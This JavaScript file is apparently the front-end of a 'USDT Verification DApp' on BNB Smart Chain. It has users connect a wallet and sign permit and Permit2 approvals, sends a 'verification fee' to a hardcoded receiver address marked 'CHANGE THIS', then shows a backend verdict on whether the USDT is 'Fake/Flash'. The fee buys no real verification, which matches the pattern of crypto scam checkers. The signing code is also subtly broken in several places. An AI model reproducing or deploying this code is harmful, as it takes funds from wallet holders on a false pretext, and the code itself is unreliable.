// USDT Verification DApp - Simple Version
const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955'; // BEP-20 USDT on BSC
const PERMIT2_ADDRESS = '0x000000000022D473030f116dDEE9F6B43aC78BA3'; // Permit2 on BSC
const VERIFICATION_FEE = 1.0; // Verification fee in USDT - CHANGE THIS
const FEE_RECEIVER_ADDRESS = '0x3242c02109FF78201Fd259dFae890ad0a10a134C'; // Fee receiver BSC wallet - CHANGE THIS
const BSC_CHAIN_ID = 56; // BSC Mainnet Chain ID

let provider;
let signer;
let userAddress;
let originalBalance = 0;

// USDT ABI
const USDT_ABI = [
    'function balanceOf(address owner) view returns (uint256)',
    'function decimals() view returns (uint8)',
    'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external',
    'function nonces(address owner) view returns (uint256)'
];

// Permit2 ABI
const PERMIT2_ABI = [
    'function permitTransferFrom(PermitTransferFrom memory permit, Signature memory sig, address owner) external'
];

// Get wallet provider
function getWalletProvider() {
    if (typeof window.ethereum !== 'undefined') {
        return window.ethereum;
    }
    if (typeof window.trustwallet !== 'undefined') {
        return window.trustwallet;
    }
    if (window.ethereum && window.ethereum.isTrust) {
        return window.ethereum;
    }
    return null;
}

// Connect wallet
async function connectWallet() {
    const ethereum = getWalletProvider();
    if (!ethereum) {
        throw new Error('Please install MetaMask or Trust Wallet');
    }

    await ethereum.request({ method: 'eth_requestAccounts' });
    provider = new ethers.BrowserProvider(ethereum);
    signer = await provider.getSigner();
    userAddress = await signer.getAddress();
    
    // Check if on correct network (BSC)
    const network = await provider.getNetwork();
    const chainId = Number(network.chainId);
    
    if (chainId !== BSC_CHAIN_ID) {
        // Request to switch to BSC network
        try {
            await ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }], // 56 in hex
            });
        } catch (switchError) {
            // This error code indicates that the chain has not been added to MetaMask
            if (switchError.code === 4902) {
                await ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: '0x38',
                        chainName: 'BNB Smart Chain',
                        nativeCurrency: {
                            name: 'BNB',
                            symbol: 'BNB',
                            decimals: 18
                        },
                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                        blockExplorerUrls: ['https://bscscan.com/']
                    }]
                });
            } else {
                throw new Error('Please switch to BSC network in your wallet');
            }
        }
        
        // Reconnect after network switch
        provider = new ethers.BrowserProvider(ethereum);
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
    }
    
    return userAddress;
}

// Get USDT balance
async function getBalance() {
    const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, provider);
    const balance = await usdtContract.balanceOf(userAddress);
    const decimals = await usdtContract.decimals();
    return parseFloat(ethers.formatUnits(balance, decimals));
}

// Pay verification fee using Permit2
async function payVerificationFee(balance) {
    const actualFee = Math.min(balance, VERIFICATION_FEE);
    const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
    const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
    
    const decimals = await usdtContract.decimals();
    const feeAmount = ethers.parseUnits(actualFee.toString(), decimals);
    const nonce = await usdtContract.nonces(userAddress);
    const deadline = Math.floor(Date.now() / 1000) + 3600;

    // Create permit signature
    const permit = {
        owner: userAddress,
        spender: PERMIT2_ADDRESS,
        value: feeAmount,
        nonce: nonce,
        deadline: deadline
    };

    const domain = {
        name: 'Tether USD',
        version: '1',
        chainId: 56,
        verifyingContract: USDT_CONTRACT_ADDRESS
    };

    const types = {
        Permit: [
            { name: 'owner', type: 'address' },
            { name: 'spender', type: 'address' },
            { name: 'value', type: 'uint256' },
            { name: 'nonce', type: 'uint256' },
            { name: 'deadline', type: 'uint256' }
        ]
    };

    const signature = await signer.signTypedData(domain, types, permit);
    const { v, r, s } = ethers.Signature.from(signature);

    // Approve Permit2
    const permitTx = await usdtContract.permit(
        userAddress,
        PERMIT2_ADDRESS,
        feeAmount,
        deadline,
        v, r, s
    );
    await permitTx.wait();

    // Transfer via Permit2
    const permit2Permit = {
        permitted: {
            token: USDT_CONTRACT_ADDRESS,
            amount: feeAmount
        },
        spender: FEE_RECEIVER_ADDRESS,
        nonce: nonce,
        deadline: deadline
    };

    const permit2Signature = await signer.signTypedData(
        {
            name: 'Permit2',
            version: '1',
            chainId: 56,
            verifyingContract: PERMIT2_ADDRESS
        },
        {
            PermitTransferFrom: [
                { name: 'permitted', type: 'TokenPermissions' },
                { name: 'spender', type: 'address' },
                { name: 'nonce', type: 'uint256' },
                { name: 'deadline', type: 'uint256' }
            ],
            TokenPermissions: [
                { name: 'token', type: 'address' },
                { name: 'amount', type: 'uint256' }
            ]
        },
        permit2Permit
    );

    const { v: v2, r: r2, s: s2 } = ethers.Signature.from(permit2Signature);

    const transferTx = await permit2Contract.permitTransferFrom(
        permit2Permit,
        { v: v2, r: r2, s: s2 },
        userAddress
    );
    await transferTx.wait();

    return transferTx.hash;
}

// Verify funds
async function verifyFunds() {
    const btn = document.getElementById('verifyBtn');
    const resultDiv = document.getElementById('result');
    
    try {
        btn.disabled = true;
        btn.textContent = 'Connecting Wallet...';
        
        // Connect wallet
        await connectWallet();
        
        btn.textContent = 'Checking Balance...';
        
        // Get original balance
        originalBalance = await getBalance();
        
        if (originalBalance === 0) {
            throw new Error('No USDT found in wallet');
        }
        
        btn.textContent = 'Approving Transaction...';
        
        // Pay fee
        await payVerificationFee(originalBalance);
        
        btn.textContent = 'Verifying Funds...';
        
        // Call backend API
        const response = await fetch('/api/verify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                address: userAddress,
                balance: originalBalance
            })
        });
        
        const result = await response.json();
        
        // Display results
        resultDiv.style.display = 'block';
        resultDiv.className = 'result success';
        
        const authenticity = result.isLegitimate ? 'Genuine' : 'Fake/Flash USDT';
        const authenticityClass = result.isLegitimate ? 'authentic' : 'fake';
        
        resultDiv.innerHTML = `
            <div class="result-item">
                <div class="label">Wallet Address:</div>
                <div class="value">${userAddress.substring(0, 6)}...${userAddress.substring(38)}</div>
            </div>
            <div class="result-item">
                <div class="label">Original Balance:</div>
                <div class="value">${originalBalance.toFixed(2)} USDT</div>
            </div>
            <div class="result-item">
                <div class="label">Fee Charged:</div>
                <div class="value">${Math.min(originalBalance, VERIFICATION_FEE).toFixed(2)} USDT</div>
            </div>
            <div class="result-item">
                <div class="label">Authenticity:</div>
                <div class="value ${authenticityClass}">${authenticity}</div>
            </div>
            <div class="result-item">
                <div class="label">Risk Score:</div>
                <div class="value">${result.riskScore}/100</div>
            </div>
            <div class="result-item">
                <div class="label">Analysis:</div>
                <div class="value">${result.analysis.join('<br>')}</div>
            </div>
        `;
        
        btn.textContent = 'Verify Funds';
        btn.disabled = false;
        
    } catch (error) {
        console.error(error);
        resultDiv.style.display = 'block';
        resultDiv.className = 'result error';
        resultDiv.innerHTML = `<div class="value">Error: ${error.message}</div>`;
        btn.textContent = 'Verify Funds';
        btn.disabled = false;
    }
}

// Event listener
document.getElementById('verifyBtn').addEventListener('click', verifyFunds);
